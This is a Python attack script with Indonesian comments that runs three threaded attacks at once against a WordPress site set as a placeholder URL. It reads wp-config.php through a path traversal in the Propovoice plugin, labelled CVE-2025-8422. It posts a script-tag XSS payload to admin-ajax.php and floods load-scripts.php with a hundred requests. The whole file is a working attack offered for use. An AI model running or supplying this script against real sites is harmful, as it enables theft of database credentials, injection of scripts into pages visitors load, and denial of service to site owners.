import requests
import threading
import time

# Disable warning SSL unverified
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Payload baca file arbitrary CVE-2025-8422
def attack_file_read(url, count):
    vuln_endpoint = "/wp-content/plugins/propovoice/send_email.php"
    payload = "?file=../../../../wp-config.php"
    for i in range(count):
        try:
            r = requests.get(url + vuln_endpoint + payload, verify=False, timeout=5)
            if "DB_NAME" in r.text:
                print(f"[FileRead] Request {i+1}: Vulnerable! Config leaked")
            else:
                print(f"[FileRead] Request {i+1}: No leak")
        except Exception as e:
            print(f"[FileRead] Request {i+1} failed: {e}")

# Payload XSS sederhana CVE di salah satu plugin populer
def attack_xss(url, count):
    xss_endpoint = "/wp-admin/admin-ajax.php"
    xss_payload = {"action":"bold_pagebuilder_save", "content":"<script>alert('XSS')</script>"}
    for i in range(count):
        try:
            r = requests.post(url + xss_endpoint, data=xss_payload, verify=False, timeout=5)
            print(f"[XSS] Request {i+1}: Status {r.status_code}")
        except Exception as e:
            print(f"[XSS] Request {i+1} failed: {e}")

# Flooding endpoint load-scripts.php seperti sebelumnya
def attack_load_scripts(url, count):
    payload = "?c=1&load=editor,common,user-profile,heartbeat"
    for i in range(count):
        try:
            r = requests.get(url + "/wp-admin/load-scripts.php" + payload, verify=False, timeout=5)
            print(f"[Flood] Request {i+1}: Status {r.status_code}")
        except Exception as e:
            print(f"[Flood] Request {i+1} failed: {e}")

def do_multithread_attack(url):
    threads = []
    threads.append(threading.Thread(target=attack_file_read, args=(url,50)))
    threads.append(threading.Thread(target=attack_xss, args=(url,50)))
    threads.append(threading.Thread(target=attack_load_scripts, args=(url,100)))

    for t in threads:
        t.start()
    for t in threads:
        t.join()

if __name__ == "__main__":
    target_url = "https://alamat-web-dummy-anda.com"  # Ganti ke URL dummy Anda
    do_multithread_attack(target_url)
